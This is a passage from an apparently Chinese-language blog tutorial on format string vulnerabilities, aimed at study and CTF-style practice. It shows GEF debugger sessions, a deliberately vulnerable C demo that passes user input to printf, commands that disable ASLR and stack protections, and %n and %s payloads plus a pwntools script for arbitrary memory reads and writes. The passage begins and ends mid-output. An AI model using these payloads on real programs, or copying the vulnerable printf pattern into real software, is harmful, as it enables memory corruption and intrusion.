class="line">0x00007fffffffdef8│+0x0030: 0x00000000007fffff</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure><p>我们发现地址未对齐，调整我们传入的参数，使得地址对齐。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python2 -c &#x27;print(&quot;%016x%016x%032d%11$n....\xd6\xde\xff\xff\xff\x7f\x00\x00&quot;)&#x27; &gt; text</span><br><span class="line">sakura@Kylin:~/文档/print$ gdb-gef fmtdemo</span><br><span class="line">Reading symbols from fmtdemo...</span><br><span class="line">GEF for linux ready, type `gef&#x27; to start, `gef config&#x27; to configure</span><br><span class="line">88 commands loaded and 5 functions added for GDB 9.1 in 0.00ms using Python engine 3.8</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r &lt; text</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo &lt; text</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  0x3130257836313025 (<span class="string">&quot;%016x%01&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: 0x3130257836313025 ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0028: 0x2e2e2e2e6e243131</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00007fffffffded6  →  &quot;ABCDEFGH&quot;</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffdec8:0x4011f60x4241000000000000</span><br><span class="line">0x7fffffffded8:0x4847464544430x3130257836313025</span><br><span class="line">0x7fffffffdee8:0x25643233302578360x2e2e2e2e6e243131</span><br><span class="line">0x7fffffffdef8:0x7fffffffded60x0</span><br><span class="line">0x7fffffffdf08:0x00x400040</span><br><span class="line">0x7fffffffdf18:0xf0b5ff0xc2</span><br><span class="line">0x7fffffffdf28:0x7fffffffdf570x7fffffffdf56</span><br><span class="line">0x7fffffffdf38:0x40125d0x7ffff7fa72e8</span><br><span class="line">0x7fffffffdf48:0x4012100x0</span><br><span class="line">0x7fffffffdf58:0x4010900xffffffffffffe060</span><br><span class="line">gef➤  finish</span><br><span class="line">Run till exit from #0  0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">main () at fmtdemo.c:8</span><br><span class="line">8    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x4a</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffded0  →  0x0040000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0xffffded62e2e2e2e</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x4a</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007fffffffd3d0  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x6e</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffded0│+0x0000: 0x0040000000000000 ← $rsp</span><br><span class="line">0x00007fffffffded8│+0x0008: 0x0000484746450000</span><br><span class="line">0x00007fffffffdee0│+0x0010: 0x3130257836313025</span><br><span class="line">0x00007fffffffdee8│+0x0018: 0x2564323330257836</span><br><span class="line">0x00007fffffffdef0│+0x0020: 0x2e2e2e2e6e243131</span><br><span class="line">0x00007fffffffdef8│+0x0028: 0x00007fffffffded6  →  0x4847464500000040 (&quot;@&quot;?)</span><br><span class="line">0x00007fffffffdf00│+0x0030: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf08│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">     0x4011e9 &lt;main+115&gt;       mov    rdi, rax</span><br><span class="line">     0x4011ec &lt;main+118&gt;       mov    eax, 0x0</span><br><span class="line">     0x4011f1 &lt;main+123&gt;       call   0x401070 &lt;printf@plt&gt;</span><br><span class="line"> →   0x4011f6 &lt;main+128&gt;       mov    edi, 0xa</span><br><span class="line">     0x4011fb &lt;main+133&gt;       call   0x401060 &lt;putchar@plt&gt;</span><br><span class="line">     0x401200 &lt;main+138&gt;       nop    </span><br><span class="line">     0x401201 &lt;main+139&gt;       leave  </span><br><span class="line">     0x401202 &lt;main+140&gt;       ret    </span><br><span class="line">     0x401203                  nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">──────────────────────────────────────────────────────── source:fmtdemo.c+8 ────</span><br><span class="line">      3     char format[128];</span><br><span class="line">      4     int arg1 = 1, arg2 = 0x88888888, arg3 = -1;</span><br><span class="line">      5     char arg4[10] = &quot;ABCDEFGH&quot;;</span><br><span class="line">      6     scanf(&quot;%s&quot;, format);</span><br><span class="line">      7     printf(format, arg1, arg2, arg3, arg4);</span><br><span class="line"> →    8     printf(&quot;\n&quot;);</span><br><span class="line">      9 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x4011f6 <span class="keyword">in</span> main (), reason: TEMPORARY BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/20g $rsp</span><br><span class="line">0x7fffffffded0:0x400000000000000x484746450000</span><br><span class="line">0x7fffffffdee0:0x31302578363130250x2564323330257836</span><br><span class="line">0x7fffffffdef0:0x2e2e2e2e6e2431310x7fffffffded6</span><br><span class="line">0x7fffffffdf00:0x00x0</span><br><span class="line">0x7fffffffdf10:0x4000400xf0b5ff</span><br><span class="line">0x7fffffffdf20:0xc20x7fffffffdf57</span><br><span class="line">0x7fffffffdf30:0x7fffffffdf560x40125d</span><br><span class="line">0x7fffffffdf40:0x7ffff7fa72e80x401210</span><br><span class="line">0x7fffffffdf50:0x00x401090</span><br><span class="line">0x7fffffffdf60:0xffffffffffffe0600x188888888</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">00000000000000010000000088888888-0000000000000000000000000000001....�����</span><br><span class="line">[Inferior 1 (process 25193) exited with code 012]</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>对比 <code>printf()</code> 函数执行前后的输出，<code>printf</code> 首先解析 <code>%11$n</code> 找到获得地址 <code>0x00007fffffffdef8</code> 的值 <code>0x00007fffffffded6</code>，然后跳转到地址 <code>0x00007fffffffded6</code>，将它的值 <code>0x4443424100000000</code> 覆盖为 <code>0x40000000000000</code>，就得到 <code>arg4=0x40000000000000</code>。</p><h4 id="225-任意地址内存覆盖"><a class="markdownIt-Anchor" href="#225-任意地址内存覆盖"></a> 2.2.5 任意地址内存覆盖</h4><p>覆盖任意地址，我们只需要将上节中的地址更改一下就能任意覆盖了。</p><p>最后还得强调两点：</p><ul><li>首先是需要关闭整个系统的 ASLR 保护，这可以保证栈在 gdb 环境中和直接运行中都保持不变，但这两个栈地址不一定相同。</li><li>其次因为在 gdb 调试环境中的栈地址和直接运行程序是不一样的，所以我们需要结合格式化字符串漏洞读取内存，先泄露一个地址出来，然后根据泄露出来的地址计算实际地址。</li></ul><h4 id="226-ctf-中的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#226-ctf-中的格式化字符串漏洞"></a> 2.2.6 CTF 中的格式化字符串漏洞</h4><blockquote><p>以下内容参考：<a href="https://bbs.pediy.com/thread-268850.htm">64位格式化字符串漏洞pwn入门</a></p></blockquote><p>目标程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fmtdemoI.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> arg1 =<span class="number">1</span>,arg2=<span class="number">0x88888888</span>,arg3=<span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> arg4[<span class="number">10</span>]=<span class="string">&quot;ABCDEFGH&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,format);</span><br><span class="line">    <span class="built_in">printf</span>(format,arg1,arg2,arg3,arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg4的地址：%p\n&quot;</span>,&amp;arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY,PIE。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -no-pie fmtdemoI.c -o fmtdemoI</span><br></pre></td></tr></table></figure><p>3.执行fmtdemoI获取arg4的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*8+&quot;.%p&quot;*20)&#x27;</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">sakura@Kylin:~/文档/print$ ./fmtdemoI</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">AAAAAAAA.0x1.0x88888888.0xffffffff.0x7fffffffdf36.0x7c.0x4241000000000000.0x484746454443.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x70252e70.0x7fffffffdfb7.0x7fffffffdfb6.0x40126d.0x7ffff7fa72e8arg4的地址：0x7fffffffdf36</span><br></pre></td></tr></table></figure><p>如上，AAAAAAAA（即4141414141414141）在格式化字符串的后8个偏移。arg4的地址为0x7fffffffdf36。</p><p>经调试，arg4的偏移为10，并且还要注意字符对齐。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python -c &#x27;print(&quot;A&quot;*11+&quot;%10$s&quot;+&quot;\x36\xdf\xff\xff\xff\x7f\x00\x00&quot;)&#x27; | ./fmtdemoI</span><br><span class="line">AAAAAAAAAAAABCDEFGH6����arg4的地址：0x7fffffffdf36</span><br></pre></td></tr></table></figure><p>以下为 python3程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fmtdemoI.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file = ELF(<span class="string">&quot;./fmtdemoI&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io = process(<span class="string">&quot;./fmtdemoI&quot;</span>)</span><br><span class="line">addr_arg4 = <span class="number">0x7fffffffdf36</span> <span class="comment">#arg4的地址</span></span><br><span class="line">payload = (<span class="string">b&#x27;A&#x27;</span>*<span class="number">11</span>)+(<span class="string">b&#x27;%10$s&#x27;</span>)+p64(addr_arg4)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>执行 <a href="http://fmtdemoI.py">fmtdemoI.py</a>，由于此时，获得的 <code>arg4</code> 的地址为 <code>0x7fffffffdf26</code>，所以跟着调整我们的 <a href="http://fmtdemoI.py">fmtdemoI.py</a> ，<code>addr_arg4 = 0x7fffffffdf26</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/print$ python3 fmt.py </span><br><span class="line">[*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26174</span><br><span class="line">b&#x27;AAAAAAAAAAA%10$s\xd6\xde\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">[DEBUG] Sent 0x19 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 25  31 30 24 73  │AAAA│AAAA│AAA%│10$s│</span><br><span class="line">    00000010  d6 de ff ff  ff 7f 00 00  0a                        │····│····│·│</span><br><span class="line">    00000019</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26174)</span><br><span class="line">[DEBUG] Received 0x31 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 d6  de ff ff ff  │AAAA│AAAA│AAA·│····│</span><br><span class="line">    00000010  7f 61 72 67  34 e7 9a 84  e5 9c b0 e5  9d 80 ef bc  │·arg│4···│····│····│</span><br><span class="line">    00000020  9a 30 78 37  66 66 66 66  66 66 66 64  66 32 36 0a  │·0x7│ffff│fffd│f26·│</span><br><span class="line">    00000030  0a                                                  │·│</span><br><span class="line">    00000031</span><br><span class="line">AAAAAAAAAAA\xd6\xde\xff\xff\xff\x7farg4的地址：0x7fffffffdf26</span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[DEBUG] Sent 0x1 bytes:</span></span><br><span class="line">    10 * 0x1</span><br><span class="line">[*] Got EOF while sending in interactive</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/sakura/.local/lib/python3.8/site-packages/pwnlib/tubes/process.py&quot;, line 746, in close</span><br><span class="line">    fd.close()</span><br><span class="line">BrokenPipeError: [Errno 32] Broken pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sakura@Kylin:~/文档/print$ python3 fmt.py </span><br><span class="line">[*] &#x27;/home/sakura/文档/print/fmtdemoI&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &#x27;./fmtdemoI&#x27; argv=[b&#x27;./fmtdemoI&#x27;] : pid 26190</span><br><span class="line">b&#x27;AAAAAAAAAAA%10$s&amp;\xdf\xff\xff\xff\x7f\x00\x00&#x27;</span><br><span class="line">[DEBUG] Sent 0x19 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 25  31 30 24 73  │AAAA│AAAA│AAA%│10$s│</span><br><span class="line">    00000010  26 df ff ff  ff 7f 00 00  0a                        │&amp;···│····│·│</span><br><span class="line">    00000019</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &#x27;./fmtdemoI&#x27; stopped with exit code 10 (pid 26190)</span><br><span class="line">[DEBUG] Received 0x39 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  42 43 44 45  │AAAA│AAAA│AAAA│BCDE│</span><br><span class="line">    00000010  46 47 48 26  df ff ff ff  7f 61 72 67  34 e7 9a 84  